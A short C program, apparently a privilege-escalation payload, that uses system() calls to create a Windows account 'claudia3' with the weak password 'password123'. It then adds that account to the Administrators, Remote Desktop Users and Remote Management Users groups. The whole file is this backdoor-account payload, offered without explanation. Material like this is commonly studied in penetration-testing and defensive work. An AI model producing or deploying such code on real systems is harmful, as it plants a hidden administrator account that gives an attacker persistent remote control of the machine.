#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user claudia3 password123 /add");
  i = system ("net localgroup administrators claudia3 /add");
  i = system ("net localgroup \"Remote Desktop Users\" claudia3 /add");  
  i = system ("net localgroup \"Remote Management Users\" claudia3 /add");
  return 0;
}
